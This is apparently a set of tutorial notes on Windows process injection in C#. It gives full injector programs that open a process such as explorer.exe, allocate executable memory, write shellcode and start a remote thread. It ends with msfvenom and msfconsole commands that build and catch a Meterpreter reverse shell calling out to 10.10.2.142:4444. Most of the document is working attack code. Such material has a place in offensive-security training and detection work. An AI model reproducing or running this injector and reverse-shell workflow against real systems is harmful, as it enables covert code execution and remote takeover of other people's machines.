### Process Injection in C#

1. **Project Setup**
    - Create a new **.NET Console App** called `Inject`.
    - Ensure the project is compiled for **x64** (when targeting 64-bit processes).
2. **`OpenProcess`**
    - Import:
        
        ```csharp
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        ```
        
    - Prototype:
        
        ```c
        HANDLE OpenProcess(
          DWORD dwDesiredAccess,
          BOOL  bInheritHandle,
          DWORD dwProcessId
        );
        ```
        
    - Usage:
        
        ```csharp
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
        ```
        
        - **dwDesiredAccess**: request `PROCESS_ALL_ACCESS (0x1F0FFF)` → full control.
        - **bInheritHandle**: `false` → no inheritance.
        - **dwProcessId**: target PID (e.g., `explorer.exe` PID).
3. **`VirtualAllocEx` (Allocating Memory in Remote Process)**
    
    Import:
    
    ```csharp
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
      uint dwSize, uint flAllocationType, uint flProtect);
    ```
    
    Prototype:
    
    ```c
    LPVOID VirtualAllocEx(
      HANDLE hProcess,
      LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flAllocationType,
      DWORD  flProtect
    );
    ```
    
    Usage:
    
    ```csharp
    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    ```
    
    - `dwSize`: 0x1000 (4KB).
    - `flAllocationType`: `MEM_COMMIT | MEM_RESERVE` (0x3000).
    - `flProtect`: `PAGE_EXECUTE_READWRITE` (0x40).
4. **`WriteProcessMemory` (Writing Shellcode)**
    
    Import:
    
    ```csharp
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    ```
    
    Prototype:
    
    ```c
    BOOL WriteProcessMemory(
      HANDLE  hProcess,
      LPVOID  lpBaseAddress,
      LPCVOID lpBuffer,
      SIZE_T  nSize,
      SIZE_T *lpNumberOfBytesWritten
    );
    ```
    
    Usage:
    
    ```csharp
    byte[] buf = new byte[591] {
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,...,0xff,0xd5
    };
    
    IntPtr outSize;
    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    ```
    
    - `hProcess`: handle from `OpenProcess`.
    - `lpBaseAddress`: remote allocated memory (`addr`).
    - `lpBuffer`: shellcode byte array.
    - `nSize`: buffer length.
5. **`CreateRemoteThread` (Execution)**
    
    Import:
    
    ```csharp
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
    ```
    
    Prototype:
    
    ```c
    HANDLE CreateRemoteThread(
      HANDLE                 hProcess,
      LPSECURITY_ATTRIBUTES  lpThreadAttributes,
      SIZE_T                 dwStackSize,
      LPTHREAD_START_ROUTINE lpStartAddress,
      LPVOID                 lpParameter,
      DWORD                  dwCreationFlags,
      LPDWORD                lpThreadId
    );
    ```
    
    Usage:
    
    ```csharp
    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
        IntPtr.Zero, 0, IntPtr.Zero);
    ```
    
    - Executes shellcode starting at `addr` inside target process.
    - Parameters & flags set to defaults (`0` or `NULL`).
6. **Dynamic PID Resolution (Optional Improvement)**
    
    Instead of hardcoding PID, resolve dynamically:
    
    ```csharp
    string targetProcessName = "explorer";
    Process[] processes = Process.GetProcessesByName(targetProcessName);
    
    if (processes.Length == 0) {
        Console.WriteLine($"Process {targetProcessName} not found.");
        return;
    }
    
    int pid = processes[0].Id;
    Console.WriteLine($"[*] Found {targetProcessName} with PID {pid}");
    
    ```
    
7. **Full Injection Workflow**
    1. Get target process handle with `OpenProcess`.
    2. Allocate memory in remote process with `VirtualAllocEx`.
    3. Write shellcode into memory with `WriteProcessMemory`.
    4. Create a thread to execute shellcode with `CreateRemoteThread`.
8. **Complete Example**        
      ```csharp
        using System;
        using System.Runtime.InteropServices;
        
        namespace Inject
        {
            class Program
            {
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
                [DllImport("kernel32.dll")]
                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
                [DllImport("kernel32.dll")]
                static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                static void Main(string[] args)
                {
                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        
                    byte[] buf = new byte[591] {
                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                    ....
                    0x0a,0x41,0x89,0xda,0xff,0xd5 };
                                IntPtr outSize;
                    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
        
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                }
            }
        }
        
      ```
        
      dynamic resolution of the PID  using `Process.GetProcessByName`.
        
      ```csharp
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        
        namespace Inject
        {
            class Program
            {
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
                [DllImport("kernel32.dll")]
                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
                [DllImport("kernel32.dll")]
                static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
                    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
                static void Main(string[] args)
                {
                    // Change this to the process name you want to inject into (without .exe)
                    string targetProcessName = "explorer";
        
                    Process[] processes = Process.GetProcessesByName(targetProcessName);
                    if (processes.Length == 0)
                    {
                        Console.WriteLine($"Process {targetProcessName} not found.");
                        return;
                    }
        
                    int pid = processes[0].Id;
                    Console.WriteLine($"[*] Found {targetProcessName} with PID {pid}");
        
                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        
                    byte[] buf = new byte[591] {
                        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                        // ... rest of your shellcode here ...
                        0x0a,0x41,0x89,0xda,0xff,0xd5
                    };
        
                    IntPtr outSize;
                    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
        
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        
                    Console.WriteLine("[*] Shellcode injected and remote thread created.");
                }
            }
        }
        
      ```
        
9. **Architecture Notes**
    - 64-bit → 64-bit, 32-bit → 32-bit, 64-bit → 32-bit injections work.
    - 32-bit → 64-bit injection fails with `CreateRemoteThread`.
        - Workaround: custom assembly stub to transition into 64-bit mode.
    - Always compile injector with correct architecture matching target process.
10. **Practical Example (Metasploit)**
    - Generate shellcode with `msfvenom`
        
        ```csharp
        msfvenom -p windows/x64/meterpreter/reverse_tcpLHOST=10.10.2.142 LPORT=4444 -f csharp
        ```
        
        - Place output in `byte[] buf` array.
        - Start a Metasploit listener:
    - Start listener
        
        ```csharp
        msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.2.142; set LPORT 4444; exploit" 
        ```
